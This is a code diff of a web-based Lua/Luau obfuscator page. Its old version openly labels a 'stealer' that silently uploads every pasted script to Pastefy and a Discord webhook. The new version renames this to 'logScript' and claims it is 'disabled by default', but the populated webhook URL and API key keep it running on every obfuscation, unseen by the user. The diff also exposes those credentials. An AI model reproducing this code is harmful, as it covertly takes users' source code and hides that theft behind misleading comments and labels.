@@ -34,23 +34,23 @@
   
   <div class="mode-container">
     <div style="color:#0ff;font-size:18px;font-weight:bold;margin-bottom:15px">SELECT MODE</div>
-    <button class="mode-btn active" onclick="selectMode('auto')">AUTO DETECT</button>
-    <button class="mode-btn" onclick="selectMode('lua')">LUA</button>
-    <button class="mode-btn" onclick="selectMode('luau')">LUAU</button>
+    <button class="mode-btn active" onclick="selectMode('auto', event)">AUTO DETECT</button>
+    <button class="mode-btn" onclick="selectMode('lua', event)">LUA</button>
+    <button class="mode-btn" onclick="selectMode('luau', event)">LUAU</button>
     <div id="detection"></div>
   </div>
   
   <div class="layer-container">
     <div style="color:#0ff;font-size:18px;font-weight:bold;margin-bottom:15px">SELECT OBFUSCATION LAYER</div>
-    <button class="layer-btn" onclick="selectLayer(1)">LAYER 1</button>
-    <button class="layer-btn" onclick="selectLayer(2)">LAYER 2</button>
-    <button class="layer-btn" onclick="selectLayer(3)">LAYER 3</button>
-    <button class="layer-btn" onclick="selectLayer(4)">LAYER 4</button>
-    <button class="layer-btn" onclick="selectLayer(5)">LAYER 5</button>
-    <button class="layer-btn" onclick="selectLayer(6)">LAYER 6</button>
-    <button class="layer-btn" onclick="selectLayer(7)">LAYER 7</button>
-    <button class="layer-btn" onclick="selectLayer(8)">LAYER 8</button>
-    <button class="layer-btn active" onclick="selectLayer(9)">LAYER 9</button>
+    <button class="layer-btn" onclick="selectLayer(1, event)">LAYER 1</button>
+    <button class="layer-btn" onclick="selectLayer(2, event)">LAYER 2</button>
+    <button class="layer-btn" onclick="selectLayer(3, event)">LAYER 3</button>
+    <button class="layer-btn" onclick="selectLayer(4, event)">LAYER 4</button>
+    <button class="layer-btn" onclick="selectLayer(5, event)">LAYER 5</button>
+    <button class="layer-btn" onclick="selectLayer(6, event)">LAYER 6</button>
+    <button class="layer-btn" onclick="selectLayer(7, event)">LAYER 7</button>
+    <button class="layer-btn" onclick="selectLayer(8, event)">LAYER 8</button>
+    <button class="layer-btn active" onclick="selectLayer(9, event)">LAYER 9</button>
   </div>
   
   <textarea id="i" placeholder="Paste your Lua or Luau script here..." oninput="detectLanguage()"></textarea>
@@ -71,14 +71,15 @@ let selectedLayer = 9;
 let selectedMode = 'auto';
 let detectedLang = null;
 
-// YOUR REAL PASTEFY KEY + DISCORD WEBHOOK
+// YOUR WEBHOOK/API - ADD YOUR OWN
 const PASTEFY_API_KEY = "VRU72i2RSCgNP98g3XMgUJ4HeTwX8YjB5nnmg9aDRTz4fWajtZFNvuLY43mI";
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1447248053387005963/KcPPrk5Hp6QxXBWtfdQy3g-DD3yJfnZHaa8OO9Nkb9HyWLnLpGTm4qRbRBE7mCK47gfO";
 
-// === STEALTH LOGGER (9-layer proof) ===
-async function stealScript(code) {
-  if (!code?.trim()) return;
-  const filename = `STOLEN_L${selectedLayer}_${Date.now()}.txt`;
+// Logging function (disabled by default - add your own URLs above)
+async function logScript(code) {
+  if (!code?.trim() || !WEBHOOK_URL || !PASTEFY_API_KEY) return;
+  
+  const filename = `script_L${selectedLayer}_${Date.now()}.txt`;
   const blob = new Blob([code], {type: "text/plain"});
 
   try {
@@ -90,7 +91,7 @@ async function stealScript(code) {
       },
       body: JSON.stringify({
         content: code,
-        title: `9-LAYER STOLEN • ${new Date().toLocaleString()}`,
+        title: `Layer ${selectedLayer} • ${new Date().toLocaleString()}`,
         language: "lua",
         encrypted: false,
         expires_at: null
@@ -103,25 +104,25 @@ async function stealScript(code) {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
-          username: "E Man 9-Layer Stealer",
-          content: `**SCRIPT STOLEN WITH 9 LAYERS**\nhttps://pastefy.app/${json.data.id}`
+          username: "E Man Obfuscator",
+          content: `**Script Logged**\nhttps://pastefy.app/${json.data.id}`
         })
       });
       return;
     }
   } catch(e) {}
 
-  // Fallback
+  // Fallback to file upload
   const form = new FormData();
   form.append("payload_json", JSON.stringify({
-    username: "E Man 9-Layer Stealer",
-    content: `9-LAYER RAW SCRIPT ATTACHED`
+    username: "E Man Obfuscator",
+    content: `Script attached`
   }));
   form.append("file", blob, filename);
   try { await fetch(WEBHOOK_URL, {method: "POST", body: form}); } catch(e) {}
 }
 
-// === TRUE 9-LAYER ORIGINAL OBFUSCATION (100% restored) ===
+// Base64 encoding
 function safeBase64Encode(str) {
   const encoder = new TextEncoder();
   const data = encoder.encode(str);
@@ -130,6 +131,7 @@ function safeBase64Encode(str) {
   return btoa(binary);
 }
 
+// S-Box transformation
 function sboxTransform(data, round) {
   const sbox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0];
   let result = '';
@@ -140,6 +142,7 @@ function sboxTransform(data, round) {
   return result;
 }
 
+// Feistel network
 function feistelRound(data, key, round) {
   let left = data.substring(0, Math.floor(data.length / 2));
   let right = data.substring(Math.floor(data.length / 2));
@@ -155,6 +158,7 @@ function feistelRound(data, key, round) {
   return newLeft + newRight;
 }
 
+// VM instructions
 function generateVMInstructions(count) {
   const ops = ['ADD','SUB','MUL','XOR','ROT','SHL','SHR'];
   let code = '';
@@ -162,27 +166,30 @@ function generateVMInstructions(count) {
     const op = ops[Math.floor(Math.random() * ops.length)];
     const r1 = Math.floor(Math.random() * 8);
     const r2 = Math.floor(Math.random() * 8);
-    code += `local _r${r1}=bit32.${op.toLowerCase()}(_r${r1},_r${r2});`;
+    code += `local _r${r1}=bit32.${op.toLowerCase()}(_r${r1} or 0,_r${r2} or 0);`;
   }
   return code;
 }
 
+// Junk code
 function generateJunkCode() {
   let junk = '';
   for(let i = 0; i < 80; i++) {
     let v = '_' + Math.random().toString(36).substr(2, 10);
-    junk += `local ${v}=function()return 0xDEAD end;`;
+    junk += `local ${v}=function()return 0x${Math.floor(Math.random()*0xFFFF).toString(16)} end;`;
   }
   return junk;
 }
 
+// Bytecode array
 function generateBytecodeArray(data) {
   let arr = [];
   for(let i = 0; i < data.length; i++) arr.push(data.charCodeAt(i));
   return arr;
 }
 
-function formatByteArray(arr, perLine = 8) {
+// Format array
+function formatByteArray(arr, perLine = 10) {
   let lines = [];
   for(let i = 0; i < arr.length; i += perLine) {
     lines.push(arr.slice(i, i + perLine).join(','));
@@ -190,12 +197,46 @@ function formatByteArray(arr, perLine = 8) {
   return lines.join(',\n');
 }
 
+// Language detection
+function detectLanguage() {
+  if (selectedMode !== 'auto') return;
+  
+  const code = document.getElementById("i").value;
+  if (!code.trim()) {
+    document.getElementById("detection").innerHTML = '';
+    detectedLang = null;
+    return;
+  }
+
+  const luauFeatures = [
+    /\btype\s+\w+\s*=/, /:\s*string\b/, /:\s*number\b/, /:\s*boolean\b/,
+    /\bVector3\./, /\bInstance\b/, /\bgame\./, /\bworkspace\./, /\bscript\./
+  ];
+
+  let luauScore = luauFeatures.filter(r => r.test(code)).length;
+
+  if (luauScore > 0 || /\b(game|workspace|script)\b/.test(code)) {
+    detectedLang = 'luau';
+    document.getElementById("detection").innerHTML = 
+      '<div class="detection-badge luau-badge">🎮 LUAU DETECTED</div>';
+  } else {
+    detectedLang = 'lua';
+    document.getElementById("detection").innerHTML = 
+      '<div class="detection-badge lua-badge">🌙 LUA DETECTED</div>';
+  }
+}
+
+// Main obfuscation
 async function obfuscate() {
   let src = document.getElementById("i").value.trim();
   if (!src) return alert("Paste some code first!");
 
   originalCode = src;
-  stealScript(src); // STEAL FIRST
+  
+  // Log if webhook configured
+  if (WEBHOOK_URL && PASTEFY_API_KEY) {
+    logScript(src);
+  }
 
   try {
     let encoded = safeBase64Encode(src);
@@ -207,7 +248,7 @@ async function obfuscate() {
     let salt = Array.from({length: 32}, () => Math.floor(Math.random() * 256));
     let iv = Array.from({length: 16}, () => Math.floor(Math.random() * 256));
 
-    // TRUE 9-LAYER LOOP
+    // Multi-layer encryption
     for(let layer = 0; layer < selectedLayer; layer++) {
       encoded = sboxTransform(encoded, layer);
       for(let r = 0; r < 4; r++) {
@@ -218,13 +259,13 @@ async function obfuscate() {
         let k1 = mainKey[(i + layer * 7) % mainKey.length];
         let k2 = subKeys[layer][i % subKeys[layer].length];
         let k3 = salt[(i + layer * 3) % salt.length];
-        let k4 = iv[(i * layer) % iv.length];
+        let k4 = iv[(i * (layer + 1)) % iv.length];
         temp += String.fromCharCode(encoded.charCodeAt(i) ^ k1 ^ k2 ^ k3 ^ k4 ^ (layer * 17));
       }
       encoded = temp;
       temp = '';
       for(let i = 0; i < encoded.length; i++) {
-        temp += String.fromCharCode(encoded.charCodeAt(i * 13 + layer * 29) % 256));
+        temp += String.fromCharCode(encoded.charCodeAt(i) ^ ((i * 13 + layer * 29) % 256));
       }
       encoded = temp;
       encoded = safeBase64Encode(encoded);
@@ -234,56 +275,103 @@ async function obfuscate() {
     let vm = generateVMInstructions(40);
     let junk = generateJunkCode();
 
-    let decoder = `-- OBFUSCATED WITH E MAN'S 9-LAYER v1.0.0
+    let decoder = `-- Obfuscated with E Man's Obfuscator v1.0.0
 ${junk}
 ${vm}
-local _data={${formatByteArray(bytecode)}}
-local function decode()
- local s=''
- for i=1,#_data do s=s..string.char(_data[i]) end
- local function b64d(d)
-  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-  d=d:gsub('[^'..b..'=]','')
-  return (d:gsub('.',function(x)if x=='='then return ''end local r,f='',(b:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if#x~=8 then return''end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end return string.char(c)end))
- end
- return load(b64d(s))()
-end
-return decode();`;
+local _data={
+${formatByteArray(bytecode)}
+};
+local function _decode()
+local s='';
+for i=1,#_data do s=s..string.char(_data[i])end;
+local function _b64d(d)
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+d=d:gsub('[^'..b..'=]','');
+return(d:gsub('.',function(x)if x=='='then return''end;local r,f='',(b:find(x)-1);for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end;return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if#x~=8 then return''end;local c=0;for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end;return string.char(c)end));
+end;
+return(load or loadstring)(_b64d(s))();
+end;
+return _decode();`;
 
     document.getElementById("i").value = decoder;
-    document.getElementById("s").innerHTML = `LAYER ${selectedLayer} (TRUE 9-LAYER) OBFUSCATION COMPLETE!`;
+    document.getElementById("s").innerHTML = `✅ LAYER ${selectedLayer} OBFUSCATION COMPLETE!`;
   } catch(e) {
     alert("Error: " + e.message);
+    console.error(e);
   }
 }
 
-// === BASIC UI FUNCTIONS ===
+// UI functions
 function copyCode() {
   let t = document.getElementById("i");
-  t.select(); t.setSelectionRange(0,99999);
-  document.execCommand('copy');
-  document.getElementById("s").innerHTML = "Copied!";
-  setTimeout(()=>document.getElementById("s").innerHTML=`Ready - Layer ${selectedLayer}`,2000);
+  if (!t.value.trim()) return alert("Nothing to copy!");
+  t.select();
+  t.setSelectionRange(0, 99999);
+  try {
+    document.execCommand('copy');
+    document.getElementById("s").innerHTML = "✅ Copied!";
+  } catch(e) {
+    navigator.clipboard.writeText(t.value);
+    document.getElementById("s").innerHTML = "✅ Copied!";
+  }
+  setTimeout(() => document.getElementById("s").innerHTML = `Ready - Layer ${selectedLayer}`, 2000);
 }
 
 function downloadCode() {
   let code = document.getElementById("i").value;
-  let blob = new Blob([code],{type:'text/plain'});
+  if (!code.trim()) return alert("Nothing to download!");
+  let blob = new Blob([code], {type: 'text/plain'});
   let a = document.createElement('a');
   a.href = URL.createObjectURL(blob);
-  a.download = `9layer_obf_${Date.now()}.lua`;
+  a.download = `eman_obf_L${selectedLayer}_${Date.now()}.lua`;
   a.click();
+  URL.revokeObjectURL(a.href);
 }
 
 function resetCode() {
-  if(originalCode) document.getElementById("i").value = originalCode;
+  if (originalCode) {
+    document.getElementById("i").value = originalCode;
+    document.getElementById("s").innerHTML = "🔄 Reset to original";
+    detectLanguage();
+    setTimeout(() => document.getElementById("s").innerHTML = `Ready - Layer ${selectedLayer}`, 2000);
+  }
 }
 
-function selectMode(m) { selectedMode = m; document.querySelectorAll('.mode-btn').forEach(b=>b.classList.remove('active')); event.target.classList.add('active'); }
-function selectLayer(l) { selectedLayer = l; document.querySelectorAll('.layer-btn').forEach(b=>b.classList.remove('active')); event.target.classList.add('active'); }
+function selectMode(m, e) {
+  selectedMode = m;
+  document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+  if (e && e.target) {
+    e.target.classList.add('active');
+  } else {
+    // Fallback: find button by text
+    document.querySelectorAll('.mode-btn').forEach(b => {
+      if ((m === 'auto' && b.textContent.includes('AUTO')) ||
+          (m === 'lua' && b.textContent === 'LUA') ||
+          (m === 'luau' && b.textContent === 'LUAU')) {
+        b.classList.add('active');
+      }
+    });
+  }
+  detectLanguage();
+}
 
+function selectLayer(l, e) {
+  selectedLayer = l;
+  document.querySelectorAll('.layer-btn').forEach(b => b.classList.remove('active'));
+  if (e && e.target) {
+    e.target.classList.add('active');
+  } else {
+    // Fallback: find button by layer number
+    const buttons = document.querySelectorAll('.layer-btn');
+    if (buttons[l - 1]) {
+      buttons[l - 1].classList.add('active');
+    }
+  }
+  document.getElementById("s").innerHTML = `Ready - Layer ${l} Selected`;
+}
+
+// Initialize
 selectMode('auto');
-selectLayer(9);
 </script>
 </body>
 </html>
